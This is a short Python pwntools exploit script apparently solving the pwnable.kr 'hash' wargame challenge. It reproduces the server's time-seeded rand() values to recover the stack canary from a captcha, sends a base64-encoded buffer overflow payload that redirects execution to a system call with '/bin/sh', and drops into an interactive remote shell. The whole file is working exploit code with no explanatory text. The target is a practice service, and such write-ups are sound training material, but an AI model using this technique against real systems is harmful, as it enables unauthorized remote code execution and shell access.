#usr/bin/python

from pwn import *
from ctypes import *
import base64

r = remote('pwnable.kr',9002)
#r = process('./hash')
#print util.proc.pidof(r)

libc = CDLL('libc.so.6')
libc.srand(libc.time(0))

libc.rand()
v4 = libc.rand()
v5 = libc.rand()
v6 = libc.rand()
v7 = libc.rand()
v8 = libc.rand()
v9 = libc.rand()
v10 = libc.rand()

r.recvuntil('captcha :')
captcha = int(r.recvuntil('\n'))
log.info('captcha is:%s' % (captcha))

canary = (captcha - v7 + v9 - v10 - v5 + v6 - v4 - v8) % 0x100000000
log.info('canary is:%s' % hex(canary))

r.sendline(str(captcha))

payload = ''
payload += 'A'*0x200
payload += p32(canary)
payload += 'B'*12
payload += p32(0x8048880)
payload += p32(0xdeadbeef)
payload += p32(0x804b3b0)

payload = base64.b64encode(payload) + '/bin/sh\x00'

pause()
r.sendline(payload) 

r.interactive()
